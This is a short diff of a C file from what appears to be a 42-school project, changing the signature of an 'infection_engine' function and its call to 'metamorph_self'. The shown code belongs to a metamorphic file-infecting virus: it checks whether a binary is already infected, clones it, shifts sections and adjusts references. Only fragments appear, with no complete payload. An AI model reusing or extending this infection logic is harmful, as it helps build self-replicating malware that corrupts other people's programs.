@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 01:31:59 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 01:53:12 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -105,7 +105,7 @@ bool		get_client_id(uint64_t *client_id, struct safe_ptr ref)
 	return true;
 }
 
-bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref, uint64_t seed[2])
+bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref)
 {
 	struct entry	original_entry;
 	struct entry	clone_entry;
@@ -117,7 +117,7 @@ bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref, 
 	|| !not_infected(&original_entry, original_ref)
 	|| !define_shift_amount(&original_entry, &shift_amount)
 	|| !get_client_id(&client_id, original_ref)
-	|| !metamorph_self(seed, son_seed, client_id)
+	|| !metamorph_self(son_seed, client_id)
 	|| !copy_to_clone(clone_ref, original_ref, original_entry.end_of_last_section, shift_amount, original_ref.size)
 	|| !adjust_references(clone_ref , shift_amount, original_entry.end_of_last_section)
 	|| !find_entry(&clone_entry, clone_ref)
